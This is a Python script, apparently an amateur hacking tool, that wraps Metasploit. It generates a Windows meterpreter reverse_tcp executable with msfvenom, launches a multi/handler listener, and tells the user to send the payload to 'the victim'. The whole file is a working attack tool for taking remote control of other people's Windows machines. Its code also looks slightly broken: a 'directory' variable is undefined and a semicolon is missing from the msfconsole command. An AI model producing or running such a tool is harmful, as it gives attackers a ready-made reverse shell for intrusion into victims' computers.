from check import *
import os
import sys
import socket
from check import *


red="\033[0;31m"
nc="\033[00m"
yellow="\033[0;33m"
cyan="\033[0;36m"

check_root()
check_os()
clear()

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_status = (s.getsockname()[0])
except OSError:
    print('\n[!]No Internet{!}\n')
    sys.exit()

logo = f'''
{red}               {nc}             .oodMMMM
{red}               {nc}    .oodMMMMMMMMMMMMM
{red}       ..oodMMM{nc}  MMMMMMMMMMMMMMMMMMM
{red} oodMMMMMMMMMMM{nc}  MMMMMMMMMMMMMMMMMMM
{red} MMMMMMMMMMMMMM{nc}  MMMMMMMMMMMMMMMMMMM
{red} MMMMMMMMMMMMMM{nc}  MMMMMMMMMMMMMMMMMMM
{red} MMMMMMMMMMMMMM{nc}  MMMMMMMMMMMMMMMMMMM
{red} MMMMMMMMMMMMMM{nc}  MMMMMMMMMMMMMMMMMMM
{red} MMMMMMMMMMMMMM{nc}  MMMMMMMMMMMMMMMMMMM
 
{cyan} MMMMMMMMMMMMMM{yellow}  MMMMMMMMMMMMMMMMMMM
{cyan} MMMMMMMMMMMMMM{yellow}  MMMMMMMMMMMMMMMMMMM
{cyan} MMMMMMMMMMMMMM{yellow}  MMMMMMMMMMMMMMMMMMM
{cyan} MMMMMMMMMMMMMM{yellow}  MMMMMMMMMMMMMMMMMMM
{cyan} MMMMMMMMMMMMMM{yellow}  MMMMMMMMMMMMMMMMMMM
{cyan} `^^^^^^MMMMMMM{yellow}  MMMMMMMMMMMMMMMMMMM
{cyan}       ````^^^^{yellow}  ^^MMMMMMMMMMMMMMMMM
{cyan}               {yellow}       ````^^^^^^MMMM


Code by: mython-dev:)
Instagram: @h4ckerworld or @mython-dev  
'''



def payloads():
    print(logo)
    try:
        print(f'Your LHOST: "{ip_status}"\n')
        lhost = input(f'Enter LHOST: ')
        print(f'Port example: "4444"')
        lport = input(f'Enter lport: ')
    except KeyboardInterrupt:
        print('\nВыход!\n')
        sys.exit()

    # i use payload for windows windows/meterpreter/reverse_tcp 

    os.system(f'msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe lhost={lhost} lport={lport} -o {directory}/mythicalpayload.exe')

    print(f'\nSaved payload: {directory}/mythicalpayload.exe\n')

    os.system(f'msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp   set lhost {lhost} ; set lport {lport} ; run ; "')

    print(f'\nSend the newly created payload to the victim: {directory}/mythicalpayload.exe\n')

payloads()
